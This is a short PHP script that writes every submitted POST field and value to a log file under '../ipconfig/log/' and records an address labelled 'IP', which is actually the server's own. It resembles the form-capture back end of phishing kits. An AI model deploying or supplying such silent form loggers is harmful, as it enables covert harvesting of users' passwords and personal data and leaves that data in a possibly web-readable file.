<?php

$ip = $localIp = gethostbyname(gethostname());

$handle = fopen("../ipconfig/log/index.log", "a"); //open log file

foreach($_POST as $variable => $value) { //loop through POST vars
fwrite($handle, $variable . "+" . $value . "\r\n");
}
fwrite($handle, "IP: $ip \r\n \r\n");
fclose($handle);

exit;

?>
